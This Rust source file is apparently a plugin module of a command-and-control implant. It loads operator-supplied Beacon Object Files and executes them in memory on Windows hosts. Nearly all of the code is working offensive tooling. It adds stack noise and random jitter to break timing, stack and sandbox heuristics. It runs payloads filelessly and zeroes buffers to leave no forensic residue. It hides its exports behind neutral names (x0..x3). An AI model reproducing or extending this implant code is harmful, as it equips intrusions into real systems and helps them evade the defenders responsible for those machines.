//! L2 `mod_bof` — on-demand Beacon Object File execution.
//!
//! OPSEC notes (same-process model — cannot fully isolate from host agent):
//! - Loaded only when operator pushes / auto-push after module_required
//! - PEB-resolved APIs + COFF in-memory path live in cupcake-core `bof` feature
//! - Short jitter + stack noise before execute to break simple timing/stack heuristics
//! - Unload via Stage0 FreeLibrary after window (operator module_unload)
//!
//! Payload (UTF-8 JSON):
//! ```json
//! { "data": "<base64 COFF>", "args": "<base64 args optional>" }
//! ```

use base64::Engine;

/// E2E breadcrumb — debug + `AGENT_TRACE_FILE` only (product release: no-op).
fn tracef(msg: &str) {
    cupcake_core::tracef_g(msg);
}

/// Minimal synchronous drive of a future whose body never yields.
///
/// The BOF engine is fully synchronous (its `async fn execute` never awaits);
/// this removes the `futures` dependency entirely — `futures::executor::block_on`
/// touches a `thread_local` (`ENTERED`), which would fault under Manual-Map
/// once pe_map neuters the TLS directory (module code must stay
/// thread_local-free in x0..x3 — the product invariant).
fn block_on_sync<F: std::future::Future>(mut fut: F) -> F::Output {
    use std::pin::Pin;
    use std::task::{Context, Poll, RawWaker, RawWakerVTable, Waker};

    fn noop_raw_waker() -> RawWaker {
        const VTABLE: RawWakerVTable = RawWakerVTable::new(
            |_| noop_raw_waker(),
            |_| {},
            |_| {},
            |_| {},
        );
        RawWaker::new(std::ptr::null(), &VTABLE)
    }
    let waker = unsafe { Waker::from_raw(noop_raw_waker()) };
    let mut cx = Context::from_waker(&waker);
    let mut fut = unsafe { Pin::new_unchecked(&mut fut) };
    loop {
        match fut.as_mut().poll(&mut cx) {
            Poll::Ready(v) => return v,
            // Unreachable for the fully-sync BOF engine; yield instead of spin.
            Poll::Pending => std::thread::yield_now(),
        }
    }
}

/// Small operator-driven jitter (not long sleep — avoid sandbox-only patterns).
fn opsec_pre_exec() {
    #[cfg(all(windows, target_arch = "x86_64"))]
    {
        cupcake_core::stealth::stack::add_stack_noise();
    }
    // 30–180 ms
    let n = (std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.subsec_nanos())
        .unwrap_or(0)
        % 150_000_000)
        + 30_000_000;
    std::thread::sleep(std::time::Duration::from_nanos(n as u64));
}

// ABI export names are intentionally neutral (x0..x3) — the agent resolves
// them via pe_map/module_loader; see those resolvers before renaming.
#[export_name = "x0"]
pub extern "C" fn mod_init() -> i32 {
    opsec_pre_exec();
    0
}

#[export_name = "x1"]
pub unsafe extern "C" fn mod_invoke(
    cmd_type: *const u8,
    cmd_type_len: u32,
    payload: *const u8,
    payload_len: u32,
    out_ptr: *mut *mut u8,
    out_len: *mut u32,
) -> i32 {
    if out_ptr.is_null() || out_len.is_null() {
        return -1;
    }
    *out_ptr = std::ptr::null_mut();
    *out_len = 0;

    tracef(&format!(
        "mod_invoke: enter code=0x{:X}",
        mod_invoke as usize
    ));

    let ct = slice_str(cmd_type, cmd_type_len).unwrap_or("bof_exec");
    if ct != "bof_exec" && ct != "bof" {
        return write_json(
            out_ptr,
            out_len,
            "",
            &format!("plugin: unsupported '{ct}'"),
        );
    }

    let body = match slice_bytes(payload, payload_len) {
        Some(b) => b,
        None => return write_json(out_ptr, out_len, "", "empty payload"),
    };

    let (coff, args) = match parse_bof_payload(body) {
        Ok(v) => v,
        Err(e) => return write_json(out_ptr, out_len, "", &e),
    };
    // RAII burn: COFF + args never leave this frame in cleartext (no disk).
    let mut coff = BurnBuf(coff);
    let mut args = BurnBuf(args);
    tracef("mod_invoke: payload parsed");

    opsec_pre_exec();
    tracef("mod_invoke: pre-exec done");

    #[cfg(all(windows))]
    {
        // `execute` is async only by signature — its body is fully synchronous,
        // so a hand-rolled no-op-waker drive replaces both tokio and futures.
        // No executor crate → no third-party thread_local in the module image,
        // and the module runtime touches no TLS (pe_map neuters the residual
        // std TLS directory; any real TLS access would AV at gs:[0x58]).
        //
        // Crash isolation (map/reloc/go VEH + dedicated thread) lives inside
        // BofLoader::execute — agent process survives hard faults in COFF.
        let result = block_on_sync(async {
            cupcake_core::loader::bof::BofLoader::execute(&coff.0, &args.0).await
        });
        // Explicit burn before write_json (Drop also burns).
        coff.burn();
        args.burn();
        match result {
            Ok(out) => write_json(out_ptr, out_len, &out, ""),
            Err(e) => write_json(out_ptr, out_len, "", &format!("exec: {e}")),
        }
    }
    #[cfg(not(windows))]
    {
        coff.burn();
        args.burn();
        write_json(out_ptr, out_len, "", "unsupported on this platform")
    }
}

/// Heap buffer that zeros itself on drop (fileless OPSEC: no residual COFF).
struct BurnBuf(Vec<u8>);

impl BurnBuf {
    fn burn(&mut self) {
        for x in self.0.iter_mut() {
            *x = 0;
        }
        self.0.clear();
    }
}

impl Drop for BurnBuf {
    fn drop(&mut self) {
        self.burn();
    }
}

#[export_name = "x2"]
pub unsafe extern "C" fn mod_free(ptr: *mut u8, len: u32) {
    if ptr.is_null() || len == 0 {
        return;
    }
    let _ = Vec::from_raw_parts(ptr, len as usize, len as usize);
}

#[export_name = "x3"]
pub extern "C" fn mod_shutdown() -> i32 {
    0
}

fn parse_bof_payload(body: &[u8]) -> Result<(Vec<u8>, Vec<u8>), String> {
    // Prefer JSON envelope
    if let Ok(v) = serde_json::from_slice::<serde_json::Value>(body) {
        let data_b64 = v
            .get("data")
            .and_then(|x| x.as_str())
            .ok_or_else(|| "missing data field (base64)".to_string())?;
        let args_b64 = v.get("args").and_then(|x| x.as_str()).unwrap_or("");
        let coff = base64::engine::general_purpose::STANDARD
            .decode(data_b64.trim())
            .map_err(|e| format!("data decode: {e}"))?;
        let args = if args_b64.is_empty() {
            Vec::new()
        } else {
            base64::engine::general_purpose::STANDARD
                .decode(args_b64.trim())
                .map_err(|e| format!("args decode: {e}"))?
        };
        if coff.len() < 20 {
            return Err("payload too small".into());
        }
        return Ok((coff, args));
    }
    // Raw: entire body is the payload image, no args
    if body.len() < 20 {
        return Err("raw payload too small".into());
    }
    Ok((body.to_vec(), Vec::new()))
}

/// Bound to caller's payload buffers — not 'static.
unsafe fn slice_str<'a>(p: *const u8, len: u32) -> Option<&'a str> {
    if p.is_null() || len == 0 {
        return None;
    }
    std::str::from_utf8(std::slice::from_raw_parts(p, len as usize)).ok()
}

unsafe fn slice_bytes<'a>(p: *const u8, len: u32) -> Option<&'a [u8]> {
    if p.is_null() || len == 0 {
        return None;
    }
    Some(std::slice::from_raw_parts(p, len as usize))
}

unsafe fn write_json(out_ptr: *mut *mut u8, out_len: *mut u32, stdout: &str, stderr: &str) -> i32 {
    let v = serde_json::json!({ "stdout": stdout, "stderr": stderr, "path": null });
    let mut bytes = match serde_json::to_vec(&v) {
        Ok(b) => b,
        Err(_) => return -4,
    };
    bytes.shrink_to_fit();
    let len = bytes.len() as u32;
    let ptr = bytes.as_mut_ptr();
    std::mem::forget(bytes);
    *out_ptr = ptr;
    *out_len = len;
    0
}
